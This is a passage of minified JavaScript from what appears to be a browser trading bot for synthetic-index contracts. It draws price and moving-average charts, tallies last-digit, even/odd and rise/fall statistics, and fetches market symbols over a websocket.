        fill: false,
        lineTension: 0,
        backgroundColor: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
        borderColor: "#fff",
        borderWidth: 1,
        data: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0],
        pointStyle: [false],
        pointRadius: 10,
        pointHoverRadius: 15,
        pointBorderWidth: 0
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: false
        },
        datalabels: {
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
lc();
const mc = () => {
  const c = document.getElementById("chartticktrisma").getContext("2d");
  const a = ["101st", "100th", "99th", "98th", "97th", "96th", "95th", "94th", "93th", "92th", "91th", "90th", "89th", "88th", "87th", "86th", "85th", "84th", "83th", "82th", "81th", "80th", "79th", "78th", "77th", "76th", "75th", "74th", "73th", "72th", "71th", "70th", "69th", "68th", "67th", "66th", "65th", "64th", "63th", "62th", "61th", "60th", "59th", "58th", "57th", "56th", "55th", "54th", "53th", "52th", "51th", "50th", "49th", "48th", "47th", "46th", "45th", "44th", "43th", "42th", "41th", "40th", "39th", "38th", "37th", "36th", "35th", "34th", "33th", "32th", "31th", "30th", "29th", "28th", "27th", "26th", "25th", "24th", "23rd", "22nd", "21st", "20th", "19th", "18th", "17th", "16th", "15th", "14th", "13th", "12th", "11th", "10th", "9th", "8th", "7th", "6th", "5th", "4th", "3rd", "2nd", "1st"];
  U = new Chart(c, {
    type: "line",
    data: {
      labels: a,
      datasets: [{
        label: "Price",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#fff",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8
      }, {
        label: "SMA#1",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#f00",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#2",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#0f0",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }, {
        label: "SMA#3",
        fill: false,
        backgroundColor: "#2e2e2e",
        borderColor: "#00f",
        borderWidth: 1,
        data: -999,
        pointStyle: false,
        pointRadius: 5,
        pointHoverRadius: 8,
        cubicInterpolationMode: "monotone",
        tension: 0.4
      }]
    },
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        }
      }
    },
    plugins: [ChartDataLabels],
    options: {
      responsive: true,
      maintainAspectRatio: false,
      plugins: {
        legend: {
          display: true,
          labels: {
            color: "#fff"
          }
        },
        datalabels: {
          display: false,
          color: ["#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e", "#2e2e2e"],
          anchor: "end",
          align: "end",
          offset: -2
        }
      },
      scales: {
        x: {
          ticks: {
            color: "#fff"
          }
        },
        y: {
          ticks: {
            color: "#fff"
          },
          grid: {
            color: function (b) {
              if (b.tick.value > 0) {
                return "#2e2e2e";
              } else if (b.tick.value < 0) {
                return "#2e2e2e";
              }
              return "#fff";
            }
          }
        }
      }
    }
  });
};
mc();
function nc(e, f, b) {
  const c = e.data;
  if (c.datasets.length > 0) {
    for (let d = 0; d < c.datasets.length; ++d) {
      c.datasets[d].data = f;
      c.datasets[d].backgroundColor = b;
    }
    e.options.plugins.datalabels.color = b;
    e.update("none");
  }
}
function oc(e, f, b) {
  const c = e.data;
  if (c.datasets.length > 0) {
    for (let d = 0; d < c.datasets.length; ++d) {
      c.datasets[d].data = f;
      c.datasets[d].backgroundColor = b;
    }
    e.options.plugins.datalabels.color = b;
    e.update("none");
  }
}
function pc(e, f, b) {
  const c = e.data;
  if (c.datasets.length > 0) {
    for (let d = 0; d < c.datasets.length; ++d) {
      c.datasets[d].data = f;
      c.datasets[d].backgroundColor = b;
    }
    e.options.plugins.datalabels.color = b;
    e.update("none");
  }
}
function qc(e, f, b) {
  const c = e.data;
  if (c.datasets.length > 0) {
    for (let d = 0; d < c.datasets.length; ++d) {
      c.datasets[d].data = f;
      c.datasets[d].backgroundColor = b;
    }
    e.options.plugins.datalabels.color = b;
    e.update("none");
  }
}
function rc(e, f, b) {
  const c = e.data;
  if (c.datasets.length > 0) {
    for (let d = 0; d < c.datasets.length; ++d) {
      c.datasets[d].data = f;
      c.datasets[d].backgroundColor = b;
    }
    e.options.plugins.datalabels.color = b;
    e.update("none");
  }
}
function sc(f, g, b, c) {
  const d = f.data;
  if (d.datasets.length > 0) {
    for (let e = 0; e < d.datasets.length; ++e) {
      d.datasets[e].data = g;
      d.datasets[e].backgroundColor = b;
      d.datasets[e].pointStyle = c;
    }
    f.options.plugins.datalabels.color = b;
    f.update("none");
  }
}
function tc(d, e) {
  const b = d.data;
  if (b.datasets.length > 0) {
    for (let c = 0; c < b.datasets.length; ++c) {
      b.datasets[c].data = e[c];
    }
    d.update("none");
  }
}
function uc(g, a) {
  var b = [];
  if (g.length < a) {
    return b;
  }
  var c = 0;
  for (var h = 0; h < a; ++h) {
    c += g[h];
  }
  b.push(c / a);
  var i = g.length - a - 1;
  for (var h = 0; h < i; ++h) {
    c = c - g[h];
    c = c + g[h + a];
    b.push(c / a);
  }
  return b;
}
function vc(f, a) {
  let b = 0;
  for (let c = 1; c < a; c++) {
    b += Math.max(0, f[c] - f[c - 1]);
  }
  b /= a;
  let g = 0;
  for (let b = 1; b < a; b++) {
    g += Math.max(0, f[b - 1] - f[b]);
  }
  g /= a;
  const h = 100 - 100 / (1 + b / g);
  return h;
}
function wc(i, j, b) {
  i = i.slice(-j);
  let c = 0;
  for (let a = 0; a < j; a++) {
    c += i[a];
  }
  const k = c / j;
  c = 0;
  for (let a = 0; a < j; a++) {
    c += Math.pow(i[a] - k, 2);
  }
  const e = Math.sqrt(c / j);
  const f = k + e * b;
  const g = k - e * b;
  return [f, k, g];
}
let xc;
let yc;
let zc;
let Ac;
let Bc;
let Cc;
let Dc;
let Ec;
let Fc;
let Gc;
let Hc;
let Ic;
let Jc;
let Kc;
let Lc;
let Mc;
let Nc;
const Oc = (i, y, a, b) => {
  let B;
  let c = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("digitstatistic") != -1;
  if (c && qb.value == "digitstatistic") {
    document.getElementById("div_digitstatistic").style.display = "block";
  } else {
    document.getElementById("div_digitstatistic").style.display = "none";
  }
  if (c) {
    let e = [];
    let a;
    let b;
    let c;
    let f;
    let g;
    let h;
    let i;
    let k;
    let l;
    Cc = [];
    for (j = 1; j <= 6; j++) {
      B = y.slice(rb[j].value * -1);
      e = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
      f = [];
      g = [];
      Cc[j] = [];
      for (const a of B) {
        e[a] = e[a] ? e[a] + 1 : 1;
      }
      b = Math.max(...e);
      c = Math.min(...e);
      for (we = 0; we <= 9; we++) {
        if (e[we] == b) {
          f.push(we);
          document.getElementById("digitstatistic_" + j + "_" + we).style.backgroundColor = "#42a5f5";
        } else if (e[we] == c) {
          g.push(we);
          document.getElementById("digitstatistic_" + j + "_" + we).style.backgroundColor = "#f44336";
        } else {
          document.getElementById("digitstatistic_" + j + "_" + we).style.backgroundColor = "#808080";
        }
        a = (e[we] / B.length * 100).toFixed(2);
        document.getElementById("digitstatistic_" + j + "_" + we).innerText = a;
        Cc[j][we] = a * 1;
      }
      document.getElementById("digitstatistic_" + j + "_least").innerText = g;
      document.getElementById("digitstatistic_" + j + "_most").innerText = f;
    }
    l = [];
    k = [];
    Cc[7] = [];
    for (we = 0; we <= 9; we++) {
      h = true;
      i = true;
      for (j = 1; j <= 6; j++) {
        var d = de(document.getElementById("digitstatistic_" + j + "_" + we).style.backgroundColor);
        if (d != "#f44336") {
          h = false;
        }
        if (d != "#42a5f5") {
          i = false;
        }
      }
      if (h) {
        document.getElementById("digitstatistic_summ_" + we).innerText = we;
        document.getElementById("digitstatistic_summ_" + we).style.backgroundColor = "#f44336";
        l.push(we);
        Cc[7][we] = we * 1;
      } else if (i) {
        document.getElementById("digitstatistic_summ_" + we).innerText = we;
        document.getElementById("digitstatistic_summ_" + we).style.backgroundColor = "#42a5f5";
        k.push(we);
        Cc[7][we] = we * 1;
      } else {
        document.getElementById("digitstatistic_summ_" + we).innerText = "";
        document.getElementById("digitstatistic_summ_" + we).style.backgroundColor = "";
        Cc[7][we] = "";
      }
    }
    document.getElementById("digitstatistic_summ_least").innerText = l;
    document.getElementById("digitstatistic_summ_most").innerText = k;
  }
  let f;
  let C;
  let D;
  let E;
  let F;
  let G;
  let H = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("thelast10digits") != -1;
  if (H && qb.value == "thelast10digits") {
    document.getElementById("div_thelast10digits").style.display = "block";
  } else {
    document.getElementById("div_thelast10digits").style.display = "none";
  }
  if (H) {
    f = i.slice(-11);
    C = y.slice(-11);
    xc = [];
    yc = [];
    zc = [];
    Ac = [];
    Bc = [];
    F = [];
    for (we = 1; we < C.length; we++) {
      D = C.length - we;
      document.getElementById("thelast10digits_digit_" + D).innerText = C[we];
      E = C[we] - C[we - 1];
      document.getElementById("thelast10digits_change_" + D).innerText = (E > 0 ? "+" : E < 0 ? "-" : "") + Math.abs(E);
      document.getElementById("thelast10digits_digitmove_" + D).innerText = E > 0 ? "Rise" : E < 0 ? "Fall" : "No";
      Ac.push(document.getElementById("thelast10digits_digitmove_" + D).innerText);
      document.getElementById("thelast10digits_change_" + D).style.backgroundColor = document.getElementById("thelast10digits_digitmove_" + D).style.backgroundColor = E > 0 ? "#42a5f5" : E < 0 ? "#f44336" : "#808080";
      E = f[we] - f[we - 1];
      document.getElementById("thelast10digits_tickmove_" + D).innerText = E > 0 ? "Rise" : E < 0 ? "Fall" : "No";
      yc.push(document.getElementById("thelast10digits_tickmove_" + D).innerText);
      document.getElementById("thelast10digits_digitgraph_" + D).innerText = (E > 0 ? "+" : E < 0 ? "-" : "") + C[we];
      document.getElementById("thelast10digits_digit_" + D).style.backgroundColor = document.getElementById("thelast10digits_tickmove_" + D).style.backgroundColor = document.getElementById("thelast10digits_digitgraph_" + D).style.backgroundColor = E > 0 ? "#42a5f5" : E < 0 ? "#f44336" : "#808080";
      Bc.push(document.getElementById("thelast10digits_digitgraph_" + D).innerText * 1);
      xc.push(document.getElementById("thelast10digits_digit_" + D).innerText * 1);
      zc.push(document.getElementById("thelast10digits_change_" + D).innerText * 1);
      F.push(document.getElementById("thelast10digits_change_" + D).style.backgroundColor);
    }
    nc(O, xc, F);
    oc(P, zc, F);
  }
  let p = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("thelast20digits_digitcater") != -1;
  if (p && qb.value == "thelast20digitscaterzian") {
    document.getElementById("div_thelast20digitscaterzian").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitscaterzian").style.display = "none";
  }
  if (p) {
    f = i.slice(-21);
    C = y.slice(-21);
    Dc = [];
    G = [];
    for (we = 1; we < C.length; we++) {
      D = C.length - we;
      E = f[we] - f[we - 1];
      document.getElementById("thelast20digits_digitcater_" + D).innerText = (E > 0 ? "+" : E < 0 ? "-" : "") + C[we];
      document.getElementById("thelast20digits_digitcater_" + D).style.backgroundColor = E > 0 ? "#42a5f5" : E < 0 ? "#f44336" : "#808080";
      Dc.push(document.getElementById("thelast20digits_digitcater_" + D).innerText * 1);
      G.push(document.getElementById("thelast20digits_digitcater_" + D).style.backgroundColor);
    }
    pc(Q, Dc, G);
  }
  let q = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("thelast20digits_digitevenodd") != -1;
  if (q && qb.value == "thelast20digitsevenodd") {
    document.getElementById("div_thelast20digitsevenodd").style.display = "block";
  } else {
    document.getElementById("div_thelast20digitsevenodd").style.display = "none";
  }
  if (q) {
    f = i.slice(-21);
    C = y.slice(-21);
    Ec = [];
    for (we = 1; we < C.length; we++) {
      D = C.length - we;
      E = f[we] - f[we - 1];
      document.getElementById("thelast20digits_digitevenodd_" + D).innerText = C[we] % 2 == 0 ? "Even" : "Odd";
      document.getElementById("thelast20digits_digitevenodd_" + D).style.backgroundColor = E > 0 ? "#42a5f5" : E < 0 ? "#f44336" : "#808080";
      Ec.push(document.getElementById("thelast20digits_digitevenodd_" + D).innerText);
    }
  }
  let r = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("risevsfall") != -1;
  if (r && qb.value == "risevsfall") {
    document.getElementById("div_risevsfall").style.display = "block";
  } else {
    document.getElementById("div_risevsfall").style.display = "none";
  }
  if (r) {
    let a;
    let b;
    let c;
    let d;
    for (j = 1; j <= 6; j++) {
      let e = ub[j].value * 1;
      B = i.slice(-e);
      a = b = 0;
      for (we = 1; we < B.length; we++) {
        if (B[we - 1] < B[we]) {
          a++;
        }
      }
      b = e - a;
      c = a / e * 100;
      d = b / e * 100;
      document.getElementById("risevsfall_" + j + "_rise").innerText = document.getElementById("risevsfall_" + j + "_rise").style.width = c.toFixed(2) + "%";
      document.getElementById("risevsfall_" + j + "_fall").innerText = document.getElementById("risevsfall_" + j + "_fall").style.width = d.toFixed(2) + "%";
    }
  }
  let s = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("evenvsodd") != -1;
  if (s && qb.value == "evenvsodd") {
    document.getElementById("div_evenvsodd").style.display = "block";
  } else {
    document.getElementById("div_evenvsodd").style.display = "none";
  }
  if (s) {
    let b;
    let a;
    let c;
    let d;
    for (j = 1; j <= 6; j++) {
      let e = sb[j].value * 1;
      B = y.slice(-e);
      b = a = 0;
      for (we = 0; we < B.length; we++) {
        if (B[we] % 2 == 0) {
          b++;
        }
      }
      a = e - b;
      c = b / e * 100;
      d = a / e * 100;
      document.getElementById("evenvsodd_" + j + "_even").innerText = document.getElementById("evenvsodd_" + j + "_even").style.width = c.toFixed(2) + "%";
      document.getElementById("evenvsodd_" + j + "_odd").innerText = document.getElementById("evenvsodd_" + j + "_odd").style.width = d.toFixed(2) + "%";
    }
  }
  let t = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("overvsunder") != -1;
  if (t && qb.value == "overvsunder") {
    document.getElementById("div_overvsunder").style.display = "block";
  } else {
    document.getElementById("div_overvsunder").style.display = "none";
  }
  if (t) {
    let b;
    let a;
    let c;
    let d;
    for (j = 1; j <= 2; j++) {
      let e = tb[j].value * 1;
      B = y.slice(-e);
      b = a = 0;
      for (we = 0; we < B.length; we++) {
        if (B[we] > document.getElementById("overvsunder_" + j + "_overdigit").value * 1) {
          b++;
        }
        if (B[we] < document.getElementById("overvsunder_" + j + "_underdigit").value * 1) {
          a++;
        }
      }
      c = b / e * 100;
      d = a / e * 100;
      document.getElementById("overvsunder_" + j + "_over").innerText = c.toFixed(2) + "%";
      document.getElementById("overvsunder_" + j + "_over").style.width = (c / Math.max(c, d) * 100).toFixed(2) + "%";
      document.getElementById("overvsunder_" + j + "_under").innerText = d.toFixed(2) + "%";
      document.getElementById("overvsunder_" + j + "_under").style.width = (d / Math.max(c, d) * 100).toFixed(2) + "%";
    }
  }
  let u;
  let I = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("thelast10ticks") != -1;
  if (I && qb.value == "thelast10ticks") {
    document.getElementById("div_thelast10ticks").style.display = "block";
  } else {
    document.getElementById("div_thelast10ticks").style.display = "none";
  }
  if (I) {
    let c;
    let b;
    let d;
    f = i.slice(-39);
    Fc = [];
    b = [];
    Gc = [];
    Hc = [];
    Jc = [];
    Ic = [];
    d = [];
    Kc = [];
    for (we = 29; we < f.length; we++) {
      D = f.length - we;
      document.getElementById("thelast10ticks_tick_" + D).innerText = f[we].toFixed(a);
      document.getElementById("thelast10ticks_move_" + D).innerText = f[we - 1] < f[we] ? "Rise" : f[we - 1] > f[we] ? "Fall" : "No";
      document.getElementById("thelast10ticks_tick_" + D).style.backgroundColor = document.getElementById("thelast10ticks_move_" + D).style.backgroundColor = f[we - 1] < f[we] ? "#42a5f5" : f[we - 1] > f[we] ? "#f44336" : "#808080";
      u = f.slice(we - 19, we + 1);
      document.getElementById("thelast10ticks_worm_" + D).innerText = f[we] == Math.max(...u) ? "Blue" : f[we] == Math.min(...u) ? "Red" : "Green";
      Hc.push(document.getElementById("thelast10ticks_worm_" + D).innerText);
      document.getElementById("thelast10ticks_worm_" + D).style.backgroundColor = f[we] == Math.max(...u) ? "#42a5f5" : f[we] == Math.min(...u) ? "#f44336" : "#0f0";
      document.getElementById("thelast10ticks_sentiment_" + D).innerText = f[we - 3] < f[we - 2] && f[we - 2] < f[we - 1] && f[we - 1] < f[we] ? "Rise" : f[we - 3] > f[we - 2] && f[we - 2] > f[we - 1] && f[we - 1] > f[we] ? "Fall" : "No";
      Ic.push(document.getElementById("thelast10ticks_sentiment_" + D).innerText);
      document.getElementById("thelast10ticks_sentiment_" + D).style.backgroundColor = f[we - 3] < f[we - 2] && f[we - 2] < f[we - 1] && f[we - 1] < f[we] ? "#42a5f5" : f[we - 3] > f[we - 2] && f[we - 2] > f[we - 1] && f[we - 1] > f[we] ? "#f44336" : "#808080";
      E = f[we] - f[we - 1];
      c = E / f[we - 1] * 100;
      document.getElementById("thelast10ticks_change_" + D).innerText = (E > 0 ? "+" : E < 0 ? "-" : "") + Math.abs(E).toFixed(2);
      document.getElementById("thelast10ticks_%_" + D).innerText = (E > 0 ? "+" : E < 0 ? "-" : "") + Math.abs(c).toFixed(2);
      Kc.push(document.getElementById("thelast10ticks_%_" + D).innerText * 1);
      document.getElementById("thelast10ticks_change_" + D).style.backgroundColor = document.getElementById("thelast10ticks_%_" + D).style.backgroundColor = E > 0 ? "#42a5f5" : E < 0 ? "#f44336" : "#808080";
      Fc.push(document.getElementById("thelast10ticks_tick_" + D).innerText * 1);
      b.push(document.getElementById("thelast10ticks_tick_" + D).style.backgroundColor);
      Gc.push(document.getElementById("thelast10ticks_move_" + D).innerText);
      Jc.push(document.getElementById("thelast10ticks_change_" + D).innerText * 1);
      d.push(document.getElementById("thelast10ticks_change_" + D).style.backgroundColor);
    }
    qc(R, Fc, b);
    rc(S, Jc, d);
  }
  let w = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("thelast20tickworm") != -1;
  if (w && qb.value == "thelast20tickworm") {
    document.getElementById("div_thelast20tickworm").style.display = "block";
  } else {
    document.getElementById("div_thelast20tickworm").style.display = "none";
  }
  if (w) {
    let a;
    let b;
    let c;
    f = i.slice(-39);
    Lc = [];
    Mc = [];
    a = [];
    b = [];
    c = [];
    for (we = 19; we < f.length; we++) {
      D = f.length - we;
      u = f.slice(we - 19, we + 1);
      document.getElementById("thelast20tickworm_history_" + D).innerText = f[we] == Math.max(...u) ? "Blue" : f[we] == Math.min(...u) ? "Red" : "Green";
      Lc.push(document.getElementById("thelast20tickworm_history_" + D).innerText);
      document.getElementById("thelast20tickworm_history_" + D).style.backgroundColor = f[we] == Math.max(...u) ? "#42a5f5" : f[we] == Math.min(...u) ? "#f44336" : "#0f0";
    }
    u = f.slice(-20);
    for (we = 19; we < f.length; we++) {
      D = f.length - we;
      document.getElementById("thelast20tickworm_current_" + D).innerText = f[we] == Math.max(...u) ? "Blue" : f[we] == Math.min(...u) ? "Red" : "Green";
      document.getElementById("thelast20tickworm_current_" + D).style.backgroundColor = f[we] == Math.max(...u) ? "#42a5f5" : f[we] == Math.min(...u) ? "#f44336" : "#0f0";
      Mc.push(document.getElementById("thelast20tickworm_current_" + D).innerText);
      a.push(f[we]);
      b.push(document.getElementById("thelast20tickworm_current_" + D).style.backgroundColor);
      if (we != f.length - 1) {
        c.push(f[we] == Math.max(...u) ? "circle" : f[we] == Math.min(...u) ? "circle" : false);
      } else {
        c.push("circle");
      }
    }
    sc(T, a, b, c);
  }
  let x = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && (N.indexOf("tick_sma") != -1 || N.indexOf("TickTrisma") != -1);
  if (x && qb.value == "tick_Trisma") {
    document.getElementById("div_tick_Trisma").style.display = "block";
  } else {
    document.getElementById("div_tick_Trisma").style.display = "none";
  }
  if (x) {
    Nc = [];
    V = uc(i, vb[1].value * 1).slice(-101);
    W = uc(i, vb[2].value * 1).slice(-101);
    X = uc(i, vb[3].value * 1).slice(-101);
    for (we = 81; we < 101; we++) {
      document.getElementById("tick_sma1_" + (101 - we)).innerText = V[we].toFixed(2);
      document.getElementById("tick_sma1_" + (101 - we)).style.backgroundColor = V[we - 1] < V[we] ? "#42a5f5" : V[we - 1] > V[we] ? "#f44336" : "#808080";
      document.getElementById("tick_sma2_" + (101 - we)).innerText = W[we].toFixed(2);
      document.getElementById("tick_sma2_" + (101 - we)).style.backgroundColor = W[we - 1] < W[we] ? "#42a5f5" : W[we - 1] > W[we] ? "#f44336" : "#808080";
      document.getElementById("tick_sma3_" + (101 - we)).innerText = X[we].toFixed(2);
      document.getElementById("tick_sma3_" + (101 - we)).style.backgroundColor = X[we - 1] < X[we] ? "#42a5f5" : X[we - 1] > X[we] ? "#f44336" : "#808080";
    }
    Nc[1] = V.slice(-20);
    Nc[2] = W.slice(-20);
    Nc[3] = X.slice(-20);
    tc(U, [i.slice(-101), V, W, X]);
  }
  let z = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("detail3ticks") != -1;
  if (z && qb.value == "detail3ticks") {
    document.getElementById("div_detail3ticks").style.display = "block";
  } else {
    document.getElementById("div_detail3ticks").style.display = "none";
  }
  if (z) {
    let c = "";
    B = i.slice(-3);
    for (we = 1; we <= 3; we++) {
      c = B[3 - we].toFixed(a).substring(0, 13);
      document.getElementById("detail3ticks_" + we + "_tick").innerText = c;
      for (j = 0; j < 12; j++) {
        if (j < c.length) {
          document.getElementById("detail3ticks_" + we + "_" + (j + 1)).innerText = c.charAt(j);
        } else {
          document.getElementById("detail3ticks_" + we + "_" + (j + 1)).innerText = "";
        }
      }
    }
  }
  if (b == "history") {
    xe = false;
  }
  ;
  Rc();
};
const Pc = (h, a, b, c, d) => {
  let e = Cb.src.split("/").pop() === "icon_run.png" || Cb.src.split("/").pop() === "icon_stop.png" && N.indexOf("continuousindices") != -1;
  if (e && qb.value == "continuousindices") {
    document.getElementById("div_continuousindices").style.display = "block";
  } else {
    document.getElementById("div_continuousindices").style.display = "none";
  }
  if (e) {
    document.getElementById("continuousindices_" + h + "_ticks").value = a;
    document.getElementById("continuousindices_" + h + "_digits").value = b;
  }
  if (d == "history") {
    xe = false;
  }
  ;
  if (Date.now() - g[h] < 500) {
    return;
  }
  ;
  g[h] = Date.now();
  if (pa && Cb.src.split("/").pop() === "icon_stop.png" && !xe && navigator.onLine) {
    od(1);
    if (!kb.checked || lb.value <= 0) {
      C = le;
    } else if (kb.checked && t < lb.value) {
      if (!s) {
        return;
      }
      C = I;
    } else {
      C = le;
    }
    if (Date.now() >= D && navigator.onLine && !xe) {
      Da = a;
      Ea = b;
      Fa = Ca[h - 1];
      oa();
    }
  }
};
const Qc = (i, a, b) => {
  let c;
  let j;
  let k;
  let l;
  let m;
  for (we = 10; we > a.length; we--) {
    c = document.getElementById("thelast10candles_" + i + "_" + we);
    c.innerText = "";
    c.style = "";
  }
  for (we = 0; we < a.length; we++) {
    c = document.getElementById("thelast10candles_" + i + "_" + (a.length - we));
    if (a[we].close > a[we].open) {
      j = "Bull";
      k = "#42a5f5";
    } else if (a[we].close < a[we].open) {
      j = "Bear";
      k = "#f44336";
    } else {
      j = "Doji";
      k = "#808080";
    }
    c.innerText = j;
    c.style.backgroundColor = k;
  }
  document.getElementById("thelast10candles_" + i + "_1_open").innerText = a[a.length - 1].open.toFixed(b);
  document.getElementById("thelast10candles_" + i + "_1_high").innerText = a[a.length - 1].high.toFixed(b);
  document.getElementById("thelast10candles_" + i + "_1_low").innerText = a[a.length - 1].low.toFixed(b);
  document.getElementById("thelast10candles_" + i + "_1_close").innerText = a[a.length - 1].close.toFixed(b);
  if (a.length > 1) {
    l = a[a.length - 1].close - a[a.length - 2].close;
    m = l / a[a.length - 2].close * 100;
    document.getElementById("thelast10candles_" + i + "_1_change").innerText = (l > 0 ? "+" : l < 0 ? "-" : "") + Math.abs(l).toFixed(2);
    document.getElementById("thelast10candles_" + i + "_1_changepercent").innerText = (l > 0 ? "+" : l < 0 ? "-" : "") + Math.abs(m).toFixed(2);
    document.getElementById("thelast10candles_" + i + "_1_change").style.backgroundColor = document.getElementById("thelast10candles_" + i + "_1_changepercent").style.backgroundColor = l > 0 ? "#42a5f5" : l < 0 ? "#f44336" : "#808080";
  } else {
    document.getElementById("thelast10candles_" + i + "_1_change").innerText = document.getElementById("thelast10candles_" + i + "_1_changepercent").innerText = document.getElementById("thelast10candles_" + i + "_1_change").style = document.getElementById("thelast10candles_" + i + "_1_changepercent").style = "";
  }
  Rc();
};
const Rc = () => {
  if (Date.now() - a < 500) {
    return;
  }
  ;
  a = Date.now();
  if (pa && Cb.src.split("/").pop() === "icon_stop.png" && !xe && navigator.onLine) {
    me();
  } else if (u.length != 0) {}
};
const Sc = () => {
  if (Cb.src.split("/").pop() == "icon_run.png") {
    if (Ia.value.trim().length == 0) {
      $.notify("Please set MASTER TOKEN.", {
        position: "bottom left",
        className: "warn"
      });
      document.getElementById("divPopupToken").style.display = "block";
      Ia.focus();
    } else {
      N = javascript.javascriptGenerator.workspaceToCode(Blockly.getMainWorkspace());
      Zd("Bot is preparing...");
      nd("stop");
      od(0);
      t = 0;
      pa = false;
      if (Ja.value.trim().length > 0) {
        fd();
      }
      ed();
      Pd();
      document.getElementById("btn_clearBoxSummary").hidden = true;
    }
  } else if (Cb.src.split("/").pop() == "icon_stop.png") {
    Tc();
    nd("run");
    Zd("Bot is not running.");
    q = false;
    r = false;
    pa = false;
    D = 0;
    document.getElementById("btn_clearBoxSummary").hidden = false;
    qd(qb.value);
  }
};
const Tc = () => {
  ka = () => {
    ja = false;
  };
  la = () => {
    if (ja) {
      ja = false;
    }
    ;
  };
  oa = () => {};
  ma = () => {};
  na = () => {};
};
Tc();
const Uc = () => {
  l = true;
  Wc();
  bd();
  if (q) {
    ed();
  }
};
const Vc = () => {
  m = true;
  bd();
  if (r) {
    fd();
  }
};
const Wc = () => {
  le.send(JSON.stringify({
    active_symbols: "brief",
    passthrough: {
      app_id: 63812
    }
  }));
};
const Xc = b => {
  E = [];
  F = [];
  G = [];
  for (we = 0; we < b.active_symbols.length; we++) {
    if (!E.includes(b.active_symbols[we].market_display_name)) {
      E.push(b.active_symbols[we].market_display_name);
    }
    if (!F.includes(b.active_symbols[we].market_display_name + "|" + b.active_symbols[we].submarket_display_name)) {
      F.push(b.active_symbols[we].market_display_name + "|" + b.active_symbols[we].submarket_display_name);
    }
    if (!G.includes(b.active_symbols[we].submarket_display_name + "|" + b.active_symbols[we].display_name + "|" + b.active_symbols[we].symbol)) {
      G.push(b.active_symbols[we].submarket_display_name + "|" + b.active_symbols[we].display_name + "|" + b.active_symbols[we].symbol);
    }
  }
  Ka.innerHTML = "";
  for (we = 0; we < E.length; we++) {
    H = document.createElement("option");
    H.textContent = E[we];
    H.value = E[we];
    Ka.appendChild(H);
  }
  if (localStorage.getItem("selSymbol") != null) {
    Yc(localStorage.getItem("selSymbol"));
  } else {
    Yc("1HZ10V");
  }
};
const Yc = d => {
  let a;
  let e;
  for (we = 0; we < G.length; we++) {
    if (G[we].split("|")[2] == d) {
      e = G[we].split("|")[0];
      break;
    }
  }
  for (we = 0; we < F.length; we++) {
    if (F[we].split("|")[1] == e) {
      a = F[we].split("|")[0];
      break;
    }
  }
  Ka.value = a;
  Zc(e, d);
};
const Zc = (c, a) => {
  La.innerHTML = "";
  for (we = 0; we < F.length; we++) {
    if (F[we].split("|")[0] == Ka.value) {
      H = document.createElement("option");
      H.textContent = F[we].split("|")[1];
      H.value = F[we].split("|")[1];
      La.appendChild(H);
    }
  }
